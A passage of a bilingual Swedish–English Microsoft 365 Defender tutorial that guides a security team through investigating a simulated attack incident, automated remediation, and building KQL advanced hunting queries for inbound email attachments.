<span data-ttu-id="7ad86-216">![Skärm bild av sidan med information om IP-adress](../../media/mtp/fig9.png)</span><span class="sxs-lookup"><span data-stu-id="7ad86-216">![Screenshot of the IP address details page](../../media/mtp/fig9.png)</span></span>

#### <a name="alert-user-and-ip-address-reconnaissance-smb-source-microsoft-defender-for-identity"></a><span data-ttu-id="7ad86-217">Varning: användare och IP-Reconnaissance (SMB) (Source: Microsoft Defender för identitet)</span><span class="sxs-lookup"><span data-stu-id="7ad86-217">Alert: User and IP address reconnaissance (SMB) (Source: Microsoft Defender for Identity)</span></span>

<span data-ttu-id="7ad86-218">Uppräkning med SMB-protokollet (Server Message Block) gör det möjligt för angripare att få till gång till den senaste inloggnings informationen som hjälper dem att gå via nätverket till ett specifikt känsligt konto.</span><span class="sxs-lookup"><span data-stu-id="7ad86-218">Enumeration using Server Message Block (SMB) protocol enables attackers to get recent user logon information that helps them move laterally through the network to access a specific sensitive account.</span></span>

<span data-ttu-id="7ad86-219">I den här identifieringen utlöses en avisering när uppräkning av SMB-sessioner körs mot en domänkontrollant.</span><span class="sxs-lookup"><span data-stu-id="7ad86-219">In this detection, an alert is triggered when the SMB session enumeration runs against a domain controller.</span></span>

![Skärm bild av Microsoft Defender för identitets varning för användare och IP-Reconnaissance](../../media/mtp/fig10.png)

### <a name="review-the-device-timeline-microsoft-defender-for-endpoint"></a><span data-ttu-id="7ad86-221">Granska enhetens tids linje [Microsoft Defender för slut punkt]</span><span class="sxs-lookup"><span data-stu-id="7ad86-221">Review the device timeline [Microsoft Defender for Endpoint]</span></span>

<span data-ttu-id="7ad86-222">När du har utforskat de olika varningarna i denna olycka navigerar du tillbaka till sidan där du undersökte dig tidigare.</span><span class="sxs-lookup"><span data-stu-id="7ad86-222">After exploring the various alerts in this incident, navigate back to the incident page you investigated earlier.</span></span> <span data-ttu-id="7ad86-223">Välj fliken **enheter** på sidan incident för att kontrol lera vilka enheter som ingår i den här incidenten som rapporteras av Microsoft Defender för slut punkten och Microsoft Defender för identiteten.</span><span class="sxs-lookup"><span data-stu-id="7ad86-223">Select the **Devices** tab in the incident page to review the devices involved in this incident as reported by Microsoft Defender for Endpoint and Microsoft Defender for Identity.</span></span>

<span data-ttu-id="7ad86-224">Välj namnet på den enhet där angreppet gjordes för att öppna enhets sidan för den specifika enheten.</span><span class="sxs-lookup"><span data-stu-id="7ad86-224">Select the name of the device where the attack was conducted, to open the entity page for that specific device.</span></span> <span data-ttu-id="7ad86-225">På den sidan kan du se aviseringar som utlöstes och relaterade händelser.</span><span class="sxs-lookup"><span data-stu-id="7ad86-225">In that page, you can see alerts that were triggered and related events.</span></span>

<span data-ttu-id="7ad86-226">Välj fliken **tids linje** för att öppna enhets tids linjen och Visa alla händelser och beteenden som observerats på enheten i kronologisk ordning, bland de notifieringar som visas.</span><span class="sxs-lookup"><span data-stu-id="7ad86-226">Select the **Timeline** tab to open the device timeline and view all events and behaviors observed on the device in chronological order, interspersed with the alerts raised.</span></span>

![Skärm bild av enhets tids linjen med beteenden](../../media/mtp/fig11.png)

<span data-ttu-id="7ad86-228">Om du expanderar några av de mer intressanta funktionerna kan du använda viktiga uppgifter, till exempel process träd.</span><span class="sxs-lookup"><span data-stu-id="7ad86-228">Expanding some of the more interesting behaviors provides useful details, such as process trees.</span></span>

<span data-ttu-id="7ad86-229">Bläddra ned till exempel tills du hittar varnings händelsen **misstänkt process inmatning**.</span><span class="sxs-lookup"><span data-stu-id="7ad86-229">For example, scroll down until you find the alert event **Suspicious process injection observed**.</span></span> <span data-ttu-id="7ad86-230">Välj **powershell.exe inmatat till notepad.exe process** under den för att visa det fullständiga process trädet för det här beteendet under diagrammet **händelse enheter** i sidofönstret.</span><span class="sxs-lookup"><span data-stu-id="7ad86-230">Select the **powershell.exe injected to notepad.exe process** event below it, to display the full process tree for this behavior under the **Event entities** graph on the side pane.</span></span> <span data-ttu-id="7ad86-231">Använd Sök fältet för filtrering om det behövs.</span><span class="sxs-lookup"><span data-stu-id="7ad86-231">Use the search bar for filtering if necessary.</span></span>

![Skärm bild av process trädet för den valda funktionen för att skapa PowerShell-filer](../../media/mtp/fig12.png)

### <a name="review-the-user-information-microsoft-cloud-app-security"></a><span data-ttu-id="7ad86-233">Granska användar informationen [Microsoft Cloud App Security]</span><span class="sxs-lookup"><span data-stu-id="7ad86-233">Review the user information [Microsoft Cloud App Security]</span></span>

<span data-ttu-id="7ad86-234">På sidan incident väljer du fliken **användare** för att visa listan över användare som är involverade i angreppet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-234">On the incident page, select the **Users** tab to display the list of users involved in the attack.</span></span> <span data-ttu-id="7ad86-235">Tabellen innehåller ytterligare information om varje användare, inklusive varje användares **gransknings prioritets** poäng.</span><span class="sxs-lookup"><span data-stu-id="7ad86-235">The table contains additional information about each user, including each user's **Investigation Priority** score.</span></span>

<span data-ttu-id="7ad86-236">Välj användar namnet för att öppna användarens profil sida där ytterligare undersökningar kan genomföras.</span><span class="sxs-lookup"><span data-stu-id="7ad86-236">Select the user name to open the user's profile page where further investigation can be conducted.</span></span> <span data-ttu-id="7ad86-237">[Läs mer om att pröva riskfyllda användare](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span><span class="sxs-lookup"><span data-stu-id="7ad86-237">[Read more about investigating risky users](https://docs.microsoft.com/cloud-app-security/tutorial-ueba#identify).</span></span>

![Skärm bild av sidan säkerhets användare för Cloud App](../../media/mtp/fig13.png)

## <a name="automated-investigation-and-remediation"></a><span data-ttu-id="7ad86-239">Automatisk undersökning och reparation</span><span class="sxs-lookup"><span data-stu-id="7ad86-239">Automated investigation and remediation</span></span>

> [!NOTE]
><span data-ttu-id="7ad86-240">Innan vi vägleder dig via den här simuleringen kan du titta på följande video och bekanta dig med vad automatisk återställning är, var du hittar den i portalen och hur den kan hjälpa dig i dina säkerhets åtgärder:</span><span class="sxs-lookup"><span data-stu-id="7ad86-240">Before we walk you through this simulation, watch the following video to get familiar with what automated self-healing is, where to find it in the portal, and how it can help in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/en-us/videoplayer/embed/RE4BzwB]

<span data-ttu-id="7ad86-241">Navigera tillbaka till incidenten i Microsoft 365 Security Center-portalen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-241">Navigate back to the incident in the Microsoft 365 Security Center portal.</span></span> <span data-ttu-id="7ad86-242">På fliken **undersökningar** på sidan **incident** visas de automatiska utredningar som utlöstes av Microsoft Defender för identitet och Microsoft Defender för slut punkter.</span><span class="sxs-lookup"><span data-stu-id="7ad86-242">The **Investigations** tab in the **Incident** page shows the automated investigations that were triggered by Microsoft Defender for Identity and Microsoft Defender for Endpoint.</span></span> <span data-ttu-id="7ad86-243">Skärm bilden nedan visar endast den automatiska undersökningen som utlöstes av Defender för slut punkten.</span><span class="sxs-lookup"><span data-stu-id="7ad86-243">The screenshot below displays only the automated investigation triggered by Defender for Endpoint.</span></span> <span data-ttu-id="7ad86-244">Som standard åtgärdar Defender för slut punkten automatiskt artefakterna i kön, vilket kräver reparation.</span><span class="sxs-lookup"><span data-stu-id="7ad86-244">By default, Defender for Endpoint automatically remediates the artifacts found in the queue, which requires remediation.</span></span>

![Skärm bild av automatiska utredningar relaterade till händelsen](../../media/mtp/fig14.png)

<span data-ttu-id="7ad86-246">Välj den avisering som utlöste en undersökning för att öppna sidan med **utrednings information** .</span><span class="sxs-lookup"><span data-stu-id="7ad86-246">Select the alert that triggered an investigation to open the **Investigation details** page.</span></span> <span data-ttu-id="7ad86-247">Följande information visas:</span><span class="sxs-lookup"><span data-stu-id="7ad86-247">You'll see the following details:</span></span>

- <span data-ttu-id="7ad86-248">Larm som utlöste den automatiserade undersökningen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-248">Alert(s) that triggered the automated investigation.</span></span>
- <span data-ttu-id="7ad86-249">Påverkade användare och enheter.</span><span class="sxs-lookup"><span data-stu-id="7ad86-249">Impacted users and devices.</span></span> <span data-ttu-id="7ad86-250">Om indikatorer hittas på ytterligare enheter visas dessa ytterligare enheter också.</span><span class="sxs-lookup"><span data-stu-id="7ad86-250">If indicators are found on additional devices, these additional devices will be listed as well.</span></span>
- <span data-ttu-id="7ad86-251">Lista över bevis.</span><span class="sxs-lookup"><span data-stu-id="7ad86-251">List of evidence.</span></span> <span data-ttu-id="7ad86-252">Entiteterna Funna och analyserade, till exempel filer, processer, tjänster, driv rutiner och nätverks adresser.</span><span class="sxs-lookup"><span data-stu-id="7ad86-252">The entities found and analyzed, such as files, processes, services, drivers, and network addresses.</span></span> <span data-ttu-id="7ad86-253">Dessa enheter analyseras för möjliga relationer till aviseringen och bedöms som ofarligt eller skadligt.</span><span class="sxs-lookup"><span data-stu-id="7ad86-253">These entities are analyzed for possible relationships to the alert and rated as benign or malicious.</span></span>
- <span data-ttu-id="7ad86-254">Hot Funna.</span><span class="sxs-lookup"><span data-stu-id="7ad86-254">Threats found.</span></span> <span data-ttu-id="7ad86-255">Kända hot som hittas under undersökningen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-255">Known threats that are found during the investigation.</span></span>

> [!NOTE]
> <span data-ttu-id="7ad86-256">Den automatiserade undersökningen kanske fortfarande körs beroende på tids inställningar.</span><span class="sxs-lookup"><span data-stu-id="7ad86-256">Depending on timing, the automated investigation might still be running.</span></span> <span data-ttu-id="7ad86-257">Vänta några minuter innan du samlar in och analyserar bevisen och granska resultaten.</span><span class="sxs-lookup"><span data-stu-id="7ad86-257">Wait a few minutes for the process to complete before you collect and analyze the evidence and review the results.</span></span> <span data-ttu-id="7ad86-258">Uppdatera **gransknings informationen** och få de senaste undersöknings resultaten.</span><span class="sxs-lookup"><span data-stu-id="7ad86-258">Refresh the **Investigation details** page to get the latest findings.</span></span>

![Skärm bild av sidan med gransknings information](../../media/mtp/fig15.png)

<span data-ttu-id="7ad86-260">Under den automatiska undersökningen identifierade Microsoft Defender för slut punkten notepad.exe processen, som sattes in som en av artefakterna som kräver reparation.</span><span class="sxs-lookup"><span data-stu-id="7ad86-260">During the automated investigation, Microsoft Defender for Endpoint identified the notepad.exe process, which was injected as one of the artifacts requiring remediation.</span></span> <span data-ttu-id="7ad86-261">Defender för slut punkt stoppar automatiskt den misstänkta process injektionen som en del av den automatiska reparationen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-261">Defender for Endpoint automatically stops the suspicious process injection as part of the automated remediation.</span></span>

<span data-ttu-id="7ad86-262">Du kan se <i>notepad.exe</i> försvinner från listan med aktiva processer på test enheten.</span><span class="sxs-lookup"><span data-stu-id="7ad86-262">You can see <i>notepad.exe</i> disappear from the list of running processes on the test device.</span></span>

## <a name="resolve-the-incident"></a><span data-ttu-id="7ad86-263">Lös problemet</span><span class="sxs-lookup"><span data-stu-id="7ad86-263">Resolve the incident</span></span>

<span data-ttu-id="7ad86-264">När undersökningen är fullständig och bekräftad kan du stänga den.</span><span class="sxs-lookup"><span data-stu-id="7ad86-264">After the investigation is complete and confirmed to be remediated, close the incident.</span></span>

<span data-ttu-id="7ad86-265">Välj **Hantera incident**.</span><span class="sxs-lookup"><span data-stu-id="7ad86-265">Select **Manage incident**.</span></span> <span data-ttu-id="7ad86-266">Ställ in statusen för att **lösa problemet** och välj relevant klassificering.</span><span class="sxs-lookup"><span data-stu-id="7ad86-266">Set the status to **Resolve incident** and select the relevant classification.</span></span>

<span data-ttu-id="7ad86-267">När händelsen är löst stänger den alla tillhör ande aviseringar i Microsoft 365 säkerhets Center och i de relaterade portalerna.</span><span class="sxs-lookup"><span data-stu-id="7ad86-267">When the incident is resolved, it closes all of the associated alerts in Microsoft 365 Security Center and in the related portals.</span></span>

![Skärm bild av sidan incidenter med panelen öppna hantera incident där du kan klicka på växeln för att lösa problemet](../../media/mtp/fig16.png)

<span data-ttu-id="7ad86-269">Då avbryter du ansöknings simuleringen för samtals hantering och automatisk utredning och scenario.</span><span class="sxs-lookup"><span data-stu-id="7ad86-269">This wraps up the attack simulation for the incident management and automated investigation and remediation scenarios.</span></span> <span data-ttu-id="7ad86-270">Nästa simulering tar dig via proaktiv hotet mot eventuella skadliga filer.</span><span class="sxs-lookup"><span data-stu-id="7ad86-270">The next simulation will take you through proactive threat hunting for potentially malicious files.</span></span>

## <a name="advanced-hunting-scenario"></a><span data-ttu-id="7ad86-271">Avancerat jakt scenario</span><span class="sxs-lookup"><span data-stu-id="7ad86-271">Advanced hunting scenario</span></span>

> [!NOTE]
> <span data-ttu-id="7ad86-272">Innan vi vägleder dig via simuleringen kan du titta på följande video för att förstå de avancerade jakt begreppen, se var du kan hitta den i portalen och vet hur den kan hjälpa dig i dina säkerhets åtgärder:</span><span class="sxs-lookup"><span data-stu-id="7ad86-272">Before we walk you through the simulation, watch the following video to understand the advanced hunting concepts, see where you can find it in the portal, and know how it can help you in your security operations:</span></span>

> [!VIDEO https://www.microsoft.com/videoplayer/embed/RE4Bp7O]

### <a name="hunting-environment-requirements"></a><span data-ttu-id="7ad86-273">Krav för jakt miljön</span><span class="sxs-lookup"><span data-stu-id="7ad86-273">Hunting environment requirements</span></span>

<span data-ttu-id="7ad86-274">Det krävs en enda intern post låda och enhet för det här scenariot.</span><span class="sxs-lookup"><span data-stu-id="7ad86-274">There's a single internal mailbox and device required for this scenario.</span></span> <span data-ttu-id="7ad86-275">Du behöver också ett externt e-postkonto för att skicka test meddelandet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-275">You'll also need an external email account to send the test message.</span></span>

1. <span data-ttu-id="7ad86-276">Kontrol lera att klient organisationen har [aktiverat Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span><span class="sxs-lookup"><span data-stu-id="7ad86-276">Verify that your tenant has [enabled Microsoft 365 Defender](https://docs.microsoft.com/microsoft-365/security/mtp/mtp-enable#starting-the-service).</span></span>
2. <span data-ttu-id="7ad86-277">Identifiera en måldator som ska användas för att ta emot e-post.</span><span class="sxs-lookup"><span data-stu-id="7ad86-277">Identify a target mailbox to be used for receiving email.</span></span>
    <span data-ttu-id="7ad86-278">a.</span><span class="sxs-lookup"><span data-stu-id="7ad86-278">a.</span></span> <span data-ttu-id="7ad86-279">Den här post lådan måste övervakas av Microsoft Defender för Office 365 b.</span><span class="sxs-lookup"><span data-stu-id="7ad86-279">This mailbox must be monitored by Microsoft Defender for Office 365 b.</span></span> <span data-ttu-id="7ad86-280">Enheten från 3] måste ha åtkomst till post lådan</span><span class="sxs-lookup"><span data-stu-id="7ad86-280">The device from requirement 3 needs to access this mailbox</span></span>
3. <span data-ttu-id="7ad86-281">Konfigurera en testen het: a.</span><span class="sxs-lookup"><span data-stu-id="7ad86-281">Configure a test device: a.</span></span> <span data-ttu-id="7ad86-282">Kontrol lera att du använder Windows 10 version 1903 eller senare version.</span><span class="sxs-lookup"><span data-stu-id="7ad86-282">Make sure you are using Windows 10 version 1903 or later version.</span></span>
    <span data-ttu-id="7ad86-283">b.</span><span class="sxs-lookup"><span data-stu-id="7ad86-283">b.</span></span> <span data-ttu-id="7ad86-284">Gå med i test enheten till test domänen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-284">Join the test device to the test domain.</span></span>
    <span data-ttu-id="7ad86-285">c.</span><span class="sxs-lookup"><span data-stu-id="7ad86-285">c.</span></span> <span data-ttu-id="7ad86-286">[Aktivera Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span><span class="sxs-lookup"><span data-stu-id="7ad86-286">[Turn on Windows Defender Antivirus](https://docs.microsoft.com/windows/security/threat-protection/windows-defender-antivirus/configure-windows-defender-antivirus-features).</span></span> <span data-ttu-id="7ad86-287">Om du har problem med att aktivera Windows Defender Antivirus kan du läsa [det här avsnittet fel sökning](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span><span class="sxs-lookup"><span data-stu-id="7ad86-287">If you are having trouble enabling Windows Defender Antivirus, see [this troubleshooting topic](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/troubleshoot-onboarding#ensure-that-windows-defender-antivirus-is-not-disabled-by-a-policy).</span></span>
    <span data-ttu-id="7ad86-288">d.</span><span class="sxs-lookup"><span data-stu-id="7ad86-288">d.</span></span> <span data-ttu-id="7ad86-289">[Till Microsoft Defender för slut punkt](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span><span class="sxs-lookup"><span data-stu-id="7ad86-289">[Onboard to Microsoft Defender for Endpoint](https://docs.microsoft.com/windows/security/threat-protection/microsoft-defender-atp/configure-endpoints).</span></span>

### <a name="run-the-simulation"></a><span data-ttu-id="7ad86-290">Kör simuleringen</span><span class="sxs-lookup"><span data-stu-id="7ad86-290">Run the simulation</span></span>

1. <span data-ttu-id="7ad86-291">Från ett externt e-postkonto skickar du ett e-postmeddelande till post lådan som identifieras i steg 2 i avsnittet krav för test miljö.</span><span class="sxs-lookup"><span data-stu-id="7ad86-291">From an external email account, send an email to the mailbox identified in step 2 of the test environment requirements section.</span></span> <span data-ttu-id="7ad86-292">Ta med en bifogad fil som ska tillåtas via befintliga e-postfilter principer.</span><span class="sxs-lookup"><span data-stu-id="7ad86-292">Include an attachment that will be allowed through any existing email filter policies.</span></span> <span data-ttu-id="7ad86-293">Denna fil behöver inte vara skadlig eller körbar.</span><span class="sxs-lookup"><span data-stu-id="7ad86-293">This file does not need to be malicious or an executable.</span></span> <span data-ttu-id="7ad86-294">Föreslagna filtyper är <i>. pdf</i>, <i>. exe</i> (om det tillåts) eller Office-dokument, till exempel en Word-fil.</span><span class="sxs-lookup"><span data-stu-id="7ad86-294">Suggested file types are <i>.pdf</i>, <i>.exe</i> (if allowed), or Office document such as a Word file.</span></span>
2. <span data-ttu-id="7ad86-295">Öppna det skickade e-postmeddelandet från enheten som har kon figurer ATS enligt steg 3 i avsnittet test miljö krav.</span><span class="sxs-lookup"><span data-stu-id="7ad86-295">Open the sent email from the device configured as defined in step 3 of the test environment requirements section.</span></span> <span data-ttu-id="7ad86-296">Öppna den bifogade filen eller spara den på enheten.</span><span class="sxs-lookup"><span data-stu-id="7ad86-296">Either open the attachment or save the file to the device.</span></span>

#### <a name="go-hunting"></a><span data-ttu-id="7ad86-297">Gå med i jakt</span><span class="sxs-lookup"><span data-stu-id="7ad86-297">Go hunting</span></span>

1. <span data-ttu-id="7ad86-298">Öppna security.microsoft.com-portalen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-298">Open the security.microsoft.com portal.</span></span>

2. <span data-ttu-id="7ad86-299">Navigera till **jakt > avancerad jakt**.</span><span class="sxs-lookup"><span data-stu-id="7ad86-299">Navigate to **Hunting > Advanced hunting**.</span></span>

   ![Skärm bild av avancerad jakt i M365 Security Center Portal navigerings fält](../../media/mtp/fig17.png)

3. <span data-ttu-id="7ad86-301">Skapa en fråga som börjar med att samla in e-posthändelser.</span><span class="sxs-lookup"><span data-stu-id="7ad86-301">Build a query that starts by gathering email events.</span></span>

   1. <span data-ttu-id="7ad86-302">I fönstret fråga väljer du nytt.</span><span class="sxs-lookup"><span data-stu-id="7ad86-302">From the query pane, select New.</span></span>

   1. <span data-ttu-id="7ad86-303">Dubbelklicka på tabellen EmailEvents från schemat.</span><span class="sxs-lookup"><span data-stu-id="7ad86-303">Double-click on the EmailEvents table from the schema.</span></span>

      ```console
      EmailEvents
      ```

   1. <span data-ttu-id="7ad86-304">Ändra tids ramen till de senaste 24 timmarna.</span><span class="sxs-lookup"><span data-stu-id="7ad86-304">Change the time frame to the last 24 hours.</span></span> <span data-ttu-id="7ad86-305">Förutsatt att e-postmeddelandet du skickade när du körde simuleringen ovan var under de senaste 24 timmarna, annars kan du ändra tids ramen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-305">Assuming the email you sent when you ran the simulation above was in the past 24 hours, otherwise change the time frame.</span></span>

      ![Skärm bild av var du kan ändra tids ramen.](../../media/mtp/fig18.png)

   1. <span data-ttu-id="7ad86-308">Kör frågan.</span><span class="sxs-lookup"><span data-stu-id="7ad86-308">Run the query.</span></span> <span data-ttu-id="7ad86-309">Du kan ha många resultat beroende på miljön för piloten.</span><span class="sxs-lookup"><span data-stu-id="7ad86-309">You may have many results depending on the environment for the pilot.</span></span>

      > [!NOTE]
      > <span data-ttu-id="7ad86-310">Se nästa steg för att filtrera alternativ för att begränsa data returen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-310">See the next step for filtering options to limit data return.</span></span>

      ![Skärm bild av de avancerade frågeresultaten](../../media/mtp/fig19.png)

        > [!NOTE]
        > <span data-ttu-id="7ad86-312">I avancerade jakt visas frågeresultat som tabell data.</span><span class="sxs-lookup"><span data-stu-id="7ad86-312">Advanced hunting displays query results as tabular data.</span></span> <span data-ttu-id="7ad86-313">Du kan också välja att visa data i andra format typer, till exempel diagram.</span><span class="sxs-lookup"><span data-stu-id="7ad86-313">You can also opt to view the data in other format types such as charts.</span></span>

   1. <span data-ttu-id="7ad86-314">Titta på resultaten och se om du kan identifiera det e-postmeddelande som du har öppnat.</span><span class="sxs-lookup"><span data-stu-id="7ad86-314">Look at the results and see if you can identify the email you opened.</span></span> <span data-ttu-id="7ad86-315">Det kan ta upp till två timmar innan meddelandet visas i en avancerad jakt.</span><span class="sxs-lookup"><span data-stu-id="7ad86-315">It may take up to 2 hours for the message to show up in advanced hunting.</span></span> <span data-ttu-id="7ad86-316">Om e-postmiljöen är stor och det finns många resultat kanske du vill använda **alternativet Visa filter** för att hitta meddelandet.</span><span class="sxs-lookup"><span data-stu-id="7ad86-316">If the email environment is large and there are many results, you might want to use the **Show Filters option** to find the message.</span></span>

      <span data-ttu-id="7ad86-317">I exemplet skickades e-postmeddelandet från ett Yahoo-konto.</span><span class="sxs-lookup"><span data-stu-id="7ad86-317">In the sample, the email was sent from a Yahoo account.</span></span> <span data-ttu-id="7ad86-318">Klicka på **+** ikonen bredvid **yahoo.com** under avsnittet SenderFromDomain och klicka sedan på **Använd** för att lägga till den markerade domänen i frågan.</span><span class="sxs-lookup"><span data-stu-id="7ad86-318">Click the **+** icon beside **yahoo.com** under the SenderFromDomain section and then click **Apply** to add the selected domain to the query.</span></span> <span data-ttu-id="7ad86-319">Använd den domän eller det e-postkonto som användes för att skicka test meddelandet i steg 1 av kör simuleringen för att filtrera resultaten.</span><span class="sxs-lookup"><span data-stu-id="7ad86-319">Use the domain or email account that was used to send the test message in step 1 of Run the Simulation to filter your results.</span></span> <span data-ttu-id="7ad86-320">Kör frågan igen för att få en mindre resultat uppsättning för att kontrol lera att meddelandet från simuleringen visas.</span><span class="sxs-lookup"><span data-stu-id="7ad86-320">Run the query again to get a smaller result set to verify that you see the message from the simulation.</span></span>

      ![Skärm bild av filtren.](../../media/mtp/fig20.png)

      ```console
      EmailEvents
      | where SenderMailFromDomain == "yahoo.com"
      ```

   1. <span data-ttu-id="7ad86-323">Klicka på de resulterande raderna i frågan så att du kan kontrol lera posten.</span><span class="sxs-lookup"><span data-stu-id="7ad86-323">Click the resulting rows from the query so you can inspect the record.</span></span>

      ![Skärm bild av panelen kontrol lera post som öppnas när ett avancerat jakt resultat är markerat](../../media/mtp/fig21.png)

4. <span data-ttu-id="7ad86-325">Nu när du har verifierat att du kan se e-postmeddelandet lägger du till ett filter för de bifogade filerna.</span><span class="sxs-lookup"><span data-stu-id="7ad86-325">Now that you have verified that you can see the email, add a filter for the attachments.</span></span> <span data-ttu-id="7ad86-326">Fokusera på alla e-postmeddelanden med bifogade filer i miljön.</span><span class="sxs-lookup"><span data-stu-id="7ad86-326">Focus on all emails with attachments in the environment.</span></span> <span data-ttu-id="7ad86-327">I det här scenariot fokuserar du på inkommande e-postmeddelanden, inte de som skickas ut från din miljö.</span><span class="sxs-lookup"><span data-stu-id="7ad86-327">For this scenario, focus on inbound emails, not those that are being sent out from your environment.</span></span> <span data-ttu-id="7ad86-328">Ta bort alla filter som du har lagt till för att hitta meddelandet och lägga till | där **AttachmentCount > 0** och **EmailDirection**  ==  **"inkommande" "**</span><span class="sxs-lookup"><span data-stu-id="7ad86-328">Remove any filters you have added to locate your message and add "| where **AttachmentCount > 0** and **EmailDirection** == **"Inbound""**</span></span>

   <span data-ttu-id="7ad86-329">I följande fråga visas resultatet med en kortare lista än den första frågan för alla e-posthändelser:</span><span class="sxs-lookup"><span data-stu-id="7ad86-329">The following query will show you the result with a shorter list than your initial query for all email events:</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   ```

5. <span data-ttu-id="7ad86-330">Ta sedan med informationen om den bifogade filen (till exempel: fil namn, hash-värden) till din resultat uppsättning.</span><span class="sxs-lookup"><span data-stu-id="7ad86-330">Next, include the information about the attachment (such as: file name, hashes) to your result set.</span></span> <span data-ttu-id="7ad86-331">För att göra det, gå med i **EmailAttachmentInfo** -tabellen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-331">To do so, join the **EmailAttachmentInfo** table.</span></span> <span data-ttu-id="7ad86-332">De vanligaste fälten som används för att ansluta i det här fallet är **NetworkMessageId** och **RecipientObjectId**.</span><span class="sxs-lookup"><span data-stu-id="7ad86-332">The common fields to use for joining, in this case are **NetworkMessageId** and **RecipientObjectId**.</span></span>

   <span data-ttu-id="7ad86-333">Följande fråga inkluderar också ytterligare en rad "| **Project – Byt namn på EmailTimestamp = tidsstämpel**"som hjälper dig att identifiera vilken tidstämpel som hör till e-postmeddelandet jämfört med tidsstämplar för de fil åtgärder som du ska lägga till i nästa steg.</span><span class="sxs-lookup"><span data-stu-id="7ad86-333">The following query also includes an additional line "| **project-rename EmailTimestamp=Timestamp**" that'll help identify which timestamp was related to the email versus timestamps related to file actions that you'll add in the next step.</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   ```

6. <span data-ttu-id="7ad86-334">Använd sedan värdet **SHA256** från tabellen **EmailAttachmentInfo** för att söka efter **DeviceFileEvents** (fil åtgärder som inträffade på slut punkten) för denna hash.</span><span class="sxs-lookup"><span data-stu-id="7ad86-334">Next, use the **SHA256** value from the **EmailAttachmentInfo** table to find **DeviceFileEvents** (file actions that happened on the endpoint) for that hash.</span></span> <span data-ttu-id="7ad86-335">Det gemensamma fältet här blir SHA256-hashvärdet för bilagan.</span><span class="sxs-lookup"><span data-stu-id="7ad86-335">The common field here will be the SHA256 hash for the attachment.</span></span>

   <span data-ttu-id="7ad86-336">Den resulterande tabellen innehåller nu information från slut punkten (Microsoft Defender för slut punkt), till exempel enhets namn, vilken åtgärd som utfördes (i det här fallet filtrerades endast för att inkludera FileCreated-händelser) och var filen lagrades.</span><span class="sxs-lookup"><span data-stu-id="7ad86-336">The resulting table now includes details from the endpoint (Microsoft Defender for Endpoint) such as device name, what action was done (in this case, filtered to only include FileCreated events), and where the file was stored.</span></span> <span data-ttu-id="7ad86-337">Det konto namn som är kopplat till processen tas också med.</span><span class="sxs-lookup"><span data-stu-id="7ad86-337">The account name associated with the process will also be included.</span></span>

   ```console
   EmailEvents
   | where AttachmentCount > 0 and EmailDirection == "Inbound"
   | project-rename EmailTimestamp=Timestamp
   | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
   | join DeviceFileEvents on SHA256
   | where ActionType == "FileCreated"
   ```

   <span data-ttu-id="7ad86-338">Nu har du skapat en fråga som identifierar alla inkommande e-postmeddelanden där användaren öppnade eller sparade den bifogade filen.</span><span class="sxs-lookup"><span data-stu-id="7ad86-338">You've now created a query that'll identify all inbound emails where the user opened or saved the attachment.</span></span> <span data-ttu-id="7ad86-339">Du kan också förfina den här frågan och filtrera efter specifika avsändare, fil storlekar, filtyper och så vidare.</span><span class="sxs-lookup"><span data-stu-id="7ad86-339">You can also refine this query to filter for specific sender domains, file sizes, file types, and so on.</span></span>

7. <span data-ttu-id="7ad86-340">Funktioner är en särskild typ av koppling, som gör att du kan hämta mer TI-information om en fil, som dess prevalen-, undertecknare-och inloggnings information, osv. Om du vill ha mer information om filen använder du funktionen **FileProfile ()** .</span><span class="sxs-lookup"><span data-stu-id="7ad86-340">Functions are a special kind of join, which let you pull more TI data about a file like its prevalence, signer and issuer info, etc. To get more details on the file, use the **FileProfile()** function enrichment:</span></span>

    ```console
    EmailEvents
    | where AttachmentCount > 0 and EmailDirection == "Inbound"
    | project-rename EmailTimestamp=Timestamp
    | join EmailAttachmentInfo on NetworkMessageId, RecipientObjectId
    | join DeviceFileEvents on SHA256
    | where ActionType == "FileCreated"
    | distinct SHA1
    | invoke FileProfile()
    ```

#### <a name="create-a-detection"></a><span data-ttu-id="7ad86-341">Skapa en identifiering</span><span class="sxs-lookup"><span data-stu-id="7ad86-341">Create a detection</span></span>

<span data-ttu-id="7ad86-342">När du har skapat en fråga som identifierar information som du vill **få aviseringar** om om de händer i framtiden kan du skapa en anpassad avkänning av frågan.</span><span class="sxs-lookup"><span data-stu-id="7ad86-342">Once you have created a query that identifies information that you'd like to **get alerted** about if they happen in the future, you can create a custom detection from the query.</span></span>

